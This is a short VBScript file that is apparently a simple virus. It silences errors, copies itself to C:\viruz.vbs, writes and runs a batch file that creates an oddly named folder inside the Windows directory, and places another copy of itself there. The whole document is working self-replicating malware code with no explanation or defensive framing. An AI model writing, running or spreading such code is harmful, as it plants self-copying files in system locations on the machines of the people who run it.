On Error Resume Next
dim fso, wsh, dosfile
set fso = createobject("scripting.filesystemobject")
set wsh = wscript.createobject ("wscript.shell")
fso.CopyFile Wscript.ScriptFullName, "C:\viruz.vbs", True 
set dosfile = fso.createtextfile ("c:\dosfile.bat", true)
dosfile.writeline ("@echo off")
dosfile.writeline ("cd %windir%")
dosfile.writeline ("md ųų")
dosfile.writeline ("cd ųų")
dosfile.writeline ("copy C:\viruz.vbs viruz.vbs")
dosfile.close
wsh.run "C:\dosfile.bat"